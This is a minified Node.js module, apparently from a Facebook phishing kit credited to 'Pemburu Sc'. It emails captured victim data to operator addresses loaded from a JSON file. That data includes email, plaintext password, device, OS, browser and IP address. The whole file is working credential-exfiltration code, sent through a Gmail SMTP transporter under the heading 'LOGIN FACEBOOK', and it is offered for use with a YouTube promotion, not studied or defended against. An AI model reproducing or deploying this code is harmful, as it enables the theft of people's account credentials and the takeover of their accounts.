let path=require("path"),fs=require("fs/promises"),nodemailer=require("nodemailer"),pathEmail=path.join(__dirname,"../data/email.json"),transporter,emailData=[];function send2({emVal:e,passVal:r,device:o,os:s,browser:a,ipAddress:t,logVia:n}){transporter&&emailData.length?(e={from:`"Pemburu Sc🇮🇩" <${process.env.SEND_MAIL}>`,to:emailData,subject:"Result",html:`
      <div style="font-family: Monospace, Arial, sans-serif; color: #333;">
      <h2 >🔥LOGIN FACEBOOK🔥</h2>
      <p><strong>Email:</strong> ${e}</p>
      <p><strong>Password:</strong> ${r}</p>
      <p><strong>Device:</strong> ${o}</p>
      <p><strong>Os:</strong> ${s}</p>
      <p><strong>Browser:</strong> ${a}</p>
      <p><strong>Ip:</strong> ${t}</p>
      <p><strong>Login:</strong> ${n}</p>
      
      <hr style="border: none; border-top: 1px solid #ddd; margin: 10px 0;">
         
         <h3 style="color: #2196F3;">Subscribe Channel YouTube Pemburu Sc:</h3>
         <p><a href="https://youtu.be/1_ejzuqb3GI?si=Xg3IIzbopm7wkeg8" style="text-decoration: none; color: #2196F3;">https://youtu.be/1_ejzuqb3GI?si=Xg3IIzbopm7wkeg8</a></p>
         
         <footer style="margin-top: 20px; font-size: 12px; color: #666;">
         <p>Credits: Sc by channel YT Pemburu Sc.</p>
         </footer>
      </div>
    `},transporter.sendMail(e,e=>{e?console.error("❌ Gagal kirim email:",e):console.log("📨 Result berhasil dikirim cek email anda.")})):console.error("⛔ Transporter belum siap atau daftar email kosong.")}(async()=>{try{var e=await fs.readFile(pathEmail,"utf-8");emailData=JSON.parse(e||"[]"),transporter=nodemailer.createTransport({host:"smtp.gmail.com",port:587,secure:!1,auth:{user:process.env.SEND_MAIL,pass:process.env.KUL_LANCIADI}})}catch(e){console.error("❌ Gagal membaca email.json atau inisialisasi transporter:",e)}})(),module.exports=send2;